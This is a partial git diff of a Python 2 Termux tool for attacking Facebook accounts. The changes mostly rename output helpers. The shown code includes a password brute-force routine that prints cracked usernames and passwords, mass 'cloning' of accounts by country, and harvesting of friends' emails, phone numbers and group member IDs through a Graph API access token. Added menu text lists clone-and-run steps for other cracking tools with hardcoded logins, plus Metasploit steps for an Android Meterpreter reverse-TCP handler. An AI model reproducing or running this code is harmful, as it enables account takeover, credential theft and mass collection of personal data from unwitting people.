+                boom('\033[1;91mgit clone https://github.com/lovehacker404/BlackMafiaNew1.12/')
+                boom('\033[1;91mls ')
+                boom('\033[1;91mcd BlackMafiaNew1.12')
+                boom('\033[1;91mpython2 lovehacker')
+                boom('\033[1;91muser name. lovehacker')
+                boom('\033[1;91mpassword . 03094161457')
+                boom('\033[1;92m⭕No14⭕')
+                boom('\033[1;91mpkg update')
+                boom('\033[1;91mpkg upgrade')
+                boom('\033[1;91mpkg install python')
+                boom('\033[1;91mpkg install python2')
+                boom('\033[1;91mpkg install git')
+                boom('\033[1;91mpip2 install requests')
+                boom('\033[1;91mpip2 install mechanize')
+                boom('\033[1;91mgit clone https://github.com/lovehacker404/RedMoonNew/')
+                boom('\033[1;91mcd RedMoonNew')
+                boom('\033[1;91mpython2 lovehacker')
+                boom('\033[1;91mUser Name:: RedMoonNew')
+                boom('\033[1;91mPassword:: lovehacker')
+                boom('\033[1;97m⭕No15⭕')
+                boom('\033[1;91mapt update')
+                boom('\033[1;91mapt upgrade')
+                boom('\033[1;91mapt install git')
+                boom('\033[1;91mapt install python ')
+                boom('\033[1;91mgit clone https://github.com/lovehacker404/Install/')
+                boom('\033[1;91mcd Install')
+                boom('\033[1;91mls ')
+                boom('\033[1;91mchmod +x *')
+                boom('\033[1;91mls')
+                boom('\033[1;91mpython all.py')
+                boom('\033[1;96m⭕No16⭕')
+                boom('\033[1;91mpkg update')
+                boom('\033[1;91mpkg upgrade')
+                boom('\033[1;91mpkg install python')
+                boom('\033[1;91mpkg install python2')
+                boom('\033[1;91mpkg install git')
+                boom('\033[1;91mpip2 install requests')
+                boom('\033[1;91mpip2 install mechanize')
+                boom('\033[1;91mgit clone https://github.com/lovehacker404/NetHunting')
+                boom('\033[1;91mcd NetHunting')
+                boom('\033[1;91mpython2 NetHunting.py')
+                boom('\033[1;91mUser Name : linux')
+                boom('\033[1;91mPassword   : lovehacker')
+                boom('\033[1;95m⭕No17⭕')
+                boom('\033[1;91mpkg update')
+                boom('\033[1;91mpkg upgrade')
+                boom('\033[1;91mpkg install python')
+                boom('\033[1;91mpkg install python2')
+                boom('\033[1;91mpkg install git')
+                boom('\033[1;91mpip2 install requests')
+                boom('\033[1;91mpip2 install mechanize')
+                boom('\033[1;91mgit clone https://github.com/lovehacker404/WorldCloning/')
+                boom('\033[1;91mcd WorldCloning')
+                boom('\033[1;91mpython2 World.py')
+                boom('\033[1;91mUser Name : World')
+                boom('\033[1;91mPassword   : lovehacker')
+                boom('\033[1;94m⭕No18⭕')
+                boom('\033[1;91mpkg update')
+                boom('\033[1;91mpkg upgrade')
+                boom('\033[1;91mpkg install python')
+                boom('\033[1;91mpkg install python2')
+                boom('\033[1;91mpkg install git')
+                boom('\033[1;91mpip2 install requests')
+                boom('\033[1;91mpip2 install mechanize')
+                boom('\033[1;91mgit clone https://github.com/lovehacker404/BangBang/')
+                boom('\033[1;91mcd BangBang')
+                boom('\033[1;91mpython2 Mafia')
+                boom('\033[1;91mUser Name: Pakistan')
+                boom('\033[1;91mpasword: lovehacker')
+                boom('\033[1;93m⭕No19⭕')
+                boom('\033[1;91mpkg update ')
+                boom('\033[1;91mpkg upgrade')
+                boom('\033[1;91mpkg install python2 ')
+                boom('\033[1;91mpip2 install mechanize')
+                boom('\033[1;91mpkg install git ')
+                boom('\033[1;91mpip2 install mechanize ')
+                boom('\033[1;91mpip2 install requests ')
+                boom('\033[1;91mgit clone https://github.com/lovehacker404/BlackMafiaError')
+                boom('\033[1;91mcd BlackMafiaError')
+                boom('\033[1;91mpython2 Error.py')
+                boom('\033[1;92m⭕No20⭕')
+                boom('\033[1;91mapt update')
+                boom('\033[1;91mapt upgrade -y ')
+                boom('\033[1;91mpkg install python -y ')
+                boom('\033[1;91mgit clone https://github.com/lovehacker404/Black_Mafia')
+                boom('\033[1;91mcd Black_Mafia')
+                boom('\033[1;91mpython3 Black_Mafia.py')
+                boom('\033[1;91m#Metasploit Commands')
+                boom('\033[1;91m》》Requirements:-')
+                boom('\033[1;91m1: Termux App (From Playstore)')
+                boom('\033[1;91m2: Good Internet connection  (Must)')
+                boom('\033[1;91m3: 2GB free Storage  (Must)')
+                boom('\033[1;91m4: Android Version 5.0+ (Must)')
+                boom('\033[1;91m5: 4GB+ RAM')
+                boom('\033[1;91m6: Fast Processor')
+                boom('\033[1;91m#installation')
+                boom('\033[1;91m1: pkg update')
+                boom('\033[1;91m2: pkg upgrade')
+                boom('\033[1;91m3: pkg install unstable-repo')
+                boom('\033[1;91m4: pkg install metasploit')
+                boom('\033[1;91m5: msfconsole')
+                boom('\033[1;91m6: use exploit/multi/handler')
+                boom('\033[1;91m7: set payload android/meterpreter/reverse_tcp ')
+                boom('\033[1;91m8: set lhost ')
+                boom('\033[1;91m9: set lport 8080')
+                boom('\033[1;91m10: exploit')
 		os.system('git pull origin master')
 		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
 		menu()
@@ -2137,25 +2138,25 @@ def pilih():
 		os.system('clear')
 		print logo6
 		print "\033[1;95m«-----------------\033[1;91mDataReset\033[1;95m---------------»"
-                jalan('\033[1;96m=10%')
-                jalan("\033[1;96m==20%")
-                jalan('\033[1;96m===30%')
-                jalan('\033[1;96m====40%')
-                jalan("\033[1;96m=====50%")
-                jalan("\033[1;96m======60%")
-                jalan('\033[1;96m=======70%')
-                jalan('\033[1;96m========80%')
-                jalan('\033[1;96m=========90%')
-                jalan('\033[1;96m==========100%')
-                jalan('\033[1;91mCloning Data Reset')
+                boom('\033[1;96m=10%')
+                boom("\033[1;96m==20%")
+                boom('\033[1;96m===30%')
+                boom('\033[1;96m====40%')
+                boom("\033[1;96m=====50%")
+                boom("\033[1;96m======60%")
+                boom('\033[1;96m=======70%')
+                boom('\033[1;96m========80%')
+                boom('\033[1;96m=========90%')
+                boom('\033[1;96m==========100%')
+                boom('\033[1;91mCloning Data Reset')
 		os.system('git pull origin master')
 		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
 		menu()
 	elif unikers =="0":
-		jalan('Token Removed')
+		boom('Token Removed')
                 print logo22
 		os.system('rm -rf login.txt')
-		keluar()
+		haHa()
 	else:
 		print "\x1b[1;91mFill in correctly"
 		pilih()
@@ -2247,14 +2248,14 @@ def pilih_crack():
 		pilih_crack()
 	
 	print "\033[1;93mTotal IDs\033[1;93m: \033[1;97m"+str(len(id))
-	jalan('\033[1;93mPlease Wait\033[1;93m...')
+	boom('\033[1;93mPlease Wait\033[1;93m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
 		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
 	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m------------------»"
-	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
-        jalan(' \033[1;95m         Start Cloning Pakistan ')
+	boom(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
+        boom(' \033[1;95m         Start Cloning Pakistan ')
 	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m------------------»"
 	
 			
@@ -2453,14 +2454,14 @@ def pilih_hack():
 		pilih_hack()
 	
 	print "\033[1;95mTotal IDs\033[1;91m: \033[1;95m"+str(len(id))
-	jalan('\033[1;91mPlease Wait\033[1;94m...')
+	boom('\033[1;91mPlease Wait\033[1;94m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
 		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
 	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m------------------»"
-	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
-        jalan(' \033[1;95m         Start Cloning Indonasia ')
+	boom(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
+        boom(' \033[1;95m         Start Cloning Indonasia ')
 	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m------------------»"
 	
 			
@@ -2653,14 +2654,14 @@ def pilih_black():
 		pilih_black()
 	
 	print "\033[1;95mTotal IDs\033[1;91m: \033[1;95m"+str(len(id))
-	jalan('\033[1;91mPlease Wait\033[1;94m...')
+	boom('\033[1;91mPlease Wait\033[1;94m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
 		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
 	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
-	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
-        jalan(' \033[1;95m         Start Cloning United State ')
+	boom(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
+        boom(' \033[1;95m         Start Cloning United State ')
 	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
 	
 			
@@ -2856,14 +2857,14 @@ def pilih_mafia():
 		pilih_mafia()
 	
 	print "\033[1;97mTotal IDs\033[1;97m: \033[1;94m"+str(len(id))
-	jalan('\033[1;94mPlease Wait\033[1;94m...')
+	boom('\033[1;94mPlease Wait\033[1;94m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
 		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
 	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
-	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
-        jalan(' \033[1;95m         Start Cloning Bangladash ')
+	boom(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
+        boom(' \033[1;95m         Start Cloning Bangladash ')
 	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
 	
 			
@@ -3060,14 +3061,14 @@ def pilih_test():
 		pilih_test()
 	
 	print "\033[1;97mTotal IDs\033[1;97m: \033[1;94m"+str(len(id))
-	jalan('\033[1;94mPlease Wait\033[1;94m...')
+	boom('\033[1;94mPlease Wait\033[1;94m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
 		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
 	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
-	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
-        jalan(' \033[1;95m         Start Cloning All Country ')
+	boom(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
+        boom(' \033[1;95m         Start Cloning All Country ')
 	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
 	
 			
@@ -3256,14 +3257,14 @@ def pilih_super():
 		pilih_super()
 	
 	print "\033[1;97mTotal IDs\033[1;97m: \033[1;94m"+str(len(id))
-	jalan('\033[1;94mPlease Wait\033[1;94m...')
+	boom('\033[1;94mPlease Wait\033[1;94m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
 		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
 	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
-	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
-        jalan(' \033[1;95m           Start Cloning Indian')
+	boom(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
+        boom(' \033[1;95m           Start Cloning Indian')
 	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
 	
 			
@@ -3422,7 +3423,7 @@ def clone_dari_member_group():
 		print"\033[1;96m[!] \x1b[1;91mToken invalid"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		keluar()
+		haHa()
 	try:
 		os.mkdir('out')
 	except OSError:
@@ -3441,10 +3442,10 @@ def clone_dari_member_group():
 		print"\033[1;96m[!] \x1b[1;91mGroup not found"
 		raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
 		crack()
-	jalan('\033[1;96m[✺] \033[1;93mMengambil email \033[1;97m...')
+	boom('\033[1;96m[✺] \033[1;93mMengambil email \033[1;97m...')
 	teman = requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
 	kimak = json.loads(teman.text)
-	jalan('\033[1;96m[✺] \033[1;93mStart \033[1;97m...')
+	boom('\033[1;96m[✺] \033[1;93mStart \033[1;97m...')
 	print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
 	print 42*"\033[1;96m="
 	for w in kimak['data']:
@@ -3510,7 +3511,7 @@ def brute():
             time.sleep(0.05)
             print '\x1b[1;93m[+] \x1b[1;93mTotal\x1b[1;94m ' + str(len(total)) + ' \x1b[1;92mPassword'
             time.sleep(0.05)
-            jalan('\x1b[1;93m[\xe2\x9c\xba] \x1b[1;95mPlease wait \x1b[1;97m...')
+            boom('\x1b[1;93m[\xe2\x9c\xba] \x1b[1;95mPlease wait \x1b[1;97m...')
             sandi = open(passw, 'r')
             for pw in sandi:
                 try:
@@ -3527,7 +3528,7 @@ def brute():
                         print 52 * '\x1b[1;93m\xe2\x95\x90'
                         print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;95mUsername \x1b[1;91m:\x1b[1;92m ' + email
                         print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;91mPassword \x1b[1;91m:\x1b[1;91m ' + pw
-                        keluar()
+                        haHa()
                     else:
                         if 'www.facebook.com' in mpsh['error_msg']:
                             ceks = open('Brutecekpoint.txt', 'w')
@@ -3540,7 +3541,7 @@ def brute():
                             print '\x1b[1;94m[\xe2\x9e\xb9] \x1b[1;95mUsername \x1b[1;93m:\x1b[1;92m ' + email
                             time.sleep(0.05)
                             print '\x1b[1;94m[\xe2\x9e\xb9] \x1b[1;95mPassword \x1b[1;93m:\x1b[1;91m ' + pw
-                            keluar()
+                            haHa()
                 except requests.exceptions.ConnectionError:
                     print '\x1b[1;91m[!] Connection Error'
                     time.sleep(1)
@@ -3566,11 +3567,11 @@ def tokenz():
 		print "\033[1;91m[!] Wrong"
 		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
 		if e =="":
-			keluar()
+			haHa()
 		elif e =="y":
 			login()
 		else:
-			keluar()
+			haHa()
 
 def get(data):
 	print '[*] Generate access token '
@@ -3648,14 +3649,14 @@ def pilih_phone():
 		pilih_phone()
 	
 	print "\033[1;97mTotal IDs\033[1;97m: \033[1;94m"+str(len(id))
-	jalan('\033[1;94mPlease Wait\033[1;94m...')
+	boom('\033[1;94mPlease Wait\033[1;94m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
 		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
 	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
-	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
-        jalan(' \033[1;95m         Start Cloning Indian Old ID')
+	boom(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
+        boom(' \033[1;95m         Start Cloning Indian Old ID')
 	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
 	
 			
@@ -3858,14 +3859,14 @@ def pilih_mail():
 		pilih_mail()
 	
 	print "\033[1;97mTotal IDs\033[1;97m: \033[1;94m"+str(len(id))
-	jalan('\033[1;94mPlease Wait\033[1;94m...')
+	boom('\033[1;94mPlease Wait\033[1;94m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
 		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
 	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
-	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
-        jalan(' \033[1;95m          Start Cloning Pakistan Old ')
+	boom(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
+        boom(' \033[1;95m          Start Cloning Pakistan Old ')
 	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
 	
 			
@@ -4061,14 +4062,14 @@ def pilih_isi():
 		pilih_isi()
 	
 	print "\033[1;97mTotal IDs\033[1;97m: \033[1;94m"+str(len(id))
-	jalan('\033[1;94mPlease Wait\033[1;94m...')
+	boom('\033[1;94mPlease Wait\033[1;94m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
 		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
 	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
-	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
-        jalan(' \033[1;95m          Start Cloning ')
+	boom(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
+        boom(' \033[1;95m          Start Cloning ')
 	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
 	
 			
@@ -4260,14 +4261,14 @@ def pilih_army():
 		pilih_army()
 	
 	print "\033[1;97mTotal IDs\033[1;97m: \033[1;94m"+str(len(id))
-	jalan('\033[1;94mPlease Wait\033[1;94m...')
+	boom('\033[1;94mPlease Wait\033[1;94m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
 		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
 	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
-	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
-        jalan(' \033[1;95m          Start Cloning Testing ')
+	boom(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
+        boom(' \033[1;95m          Start Cloning Testing ')
 	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
 	def main(arg):
 		user = arg
@@ -4505,7 +4506,7 @@ def id_friends():
             z = json.loads(r.text)
             save_id = raw_input('\x1b[1;91m[+] \x1b[1;92mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
             bz = open(save_id, 'w')
-            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
+            boom('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
             print 52 * '\x1b[1;97m\xe2\x95\x90'
             for ah in z['data']:
                 idfriends.append(ah['id'])
@@ -4534,7 +4535,7 @@ def id_friends():
             asif()
         except requests.exceptions.ConnectionError:
             print '\x1b[1;91m[\xe2\x9c\x96] No connection'
-            keluar()
+            haHa()
 
 
 def idfrom_friends():
@@ -4565,7 +4566,7 @@ def idfrom_friends():
             z = json.loads(r.text)
             save_idt = raw_input('\x1b[1;91m[+] \x1b[1;92mType File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
             bz = open(save_idt, 'w')
-            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mplzz wi8 \x1b[1;97m...')
+            boom('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mplzz wi8 \x1b[1;97m...')
             print 52 * '\x1b[1;97m\xe2\x95\x90'
             for ah in z['friends']['data']:
                 idfromfriends.append(ah['id'])
@@ -4589,7 +4590,7 @@ def idfrom_friends():
             menu()
         except requests.exceptions.ConnectionError:
             print '\x1b[1;91m[\xe2\x9c\x96] No connection'
-            keluar()
+            haHa()
 
 
 def id_member_grup():
@@ -4618,7 +4619,7 @@ def id_member_grup():
 
             simg = raw_input('\x1b[1;91m[+] \x1b[1;97mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
             b = open(simg, 'w')
-            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mplzz wi8 \x1b[1;97m...')
+            boom('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mplzz wi8 \x1b[1;97m...')
             print 52 * '\x1b[1;97m\xe2\x95\x90'
             re = requests.get('https://graph.facebook.com/' + id + '/members?fields=name,id&access_token=' + toket)
             s = json.loads(re.text)
@@ -4649,7 +4650,7 @@ def id_member_grup():
             menu()
         except requests.exceptions.ConnectionError:
             print '\x1b[1;91m[\xe2\x9c\x96] No connection'
-            keluar()
+            haHa()
 
 
 def email():
@@ -4670,7 +4671,7 @@ def email():
             r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
             a = json.loads(r.text)
             mpsh = open(mails, 'w')
-            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
+            boom('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
             print 52 * '\x1b[1;97m\xe2\x95\x90'
             for i in a['data']:
                 x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
@@ -4704,7 +4705,7 @@ def email():
             asif()
         except requests.exceptions.ConnectionError:
             print '\x1b[1;91m[\xe2\x9c\x96] No connection'
-            keluar()
+            haHa()
 
 
 def emailfrom_friends():
@@ -4735,7 +4736,7 @@ def emailfrom_friends():
             r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
             a = json.loads(r.text)
             mpsh = open(mails, 'w')
-            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
+            boom('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
             print 52 * '\x1b[1;97m\xe2\x95\x90'
             for i in a['data']:
                 x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
@@ -4764,7 +4765,7 @@ def emailfrom_friends():
             asif()
         except requests.exceptions.ConnectionError:
             print '\x1b[1;91m[\xe2\x9c\x96] No connection'
-            keluar()
+            haHa()
 
 
 def nomor_hp():
@@ -4786,7 +4787,7 @@ def nomor_hp():
             r = requests.get(url)
             z = json.loads(r.text)
             no = open(noms, 'w')
-            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
+            boom('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
             print 52 * '\x1b[1;97m\xe2\x95\x90'
             for n in z['data']:
                 x = requests.get('https://graph.facebook.com/' + n['id'] + '?access_token=' + toket)
@@ -4820,7 +4821,7 @@ def nomor_hp():
             asif()
         except requests.exceptions.ConnectionError:
             print '\x1b[1;91m[\xe2\x9c\x96] No connection'
-            keluar()
+            haHa()
 
 
 def hpfrom_friends():
@@ -4851,7 +4852,7 @@ def hpfrom_friends():
             r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
             a = json.loads(r.text)
             no = open(noms, 'w')
-            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
+            boom('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
             print 52 * '\x1b[1;97m\xe2\x95\x90'
             for i in a['data']:
                 x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
@@ -4880,7 +4881,7 @@ def hpfrom_friends():
             asif()
         except requests.exceptions.ConnectionError:
             print '\x1b[1;95m[\xe2\x9c\x96] No connection'
-            keluar()
+            haHa()
 
 def informasi():
 	os.system('reset')
@@ -4894,7 +4895,7 @@ def informasi():
 	os.system('reset')
 	print logo16
 	aid = raw_input('\033[1;91m[+] \033[1;92mEnter ID\033[1;97m/\033[1;92mName\033[1;91m : \033[1;97m')
-	jalan('\033[1;91m[✺] \033[1;92mWait a minute \033[1;97m...')
+	boom('\033[1;91m[✺] \033[1;92mWait a minute \033[1;97m...')
 	r = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
 	cok = json.loads(r.text)
 	for i in cok['data']:
@@ -5496,11 +5497,11 @@ def action():
 		action()
 
 	xxx = str(len(id))
-	jalan ('[✓] Total Numbers: '+xxx)
+	boom ('[✓] Total Numbers: '+xxx)
 	time.sleep(0.05)
-	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
+	boom(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
 	time.sleep(0.05)
-	jalan ('[!] To Stop Process Press CTRL Then Press z')
+	boom ('[!] To Stop Process Press CTRL Then Press z')
 	time.sleep(0.05)
 	print 44*'-'
 	print (logo13)
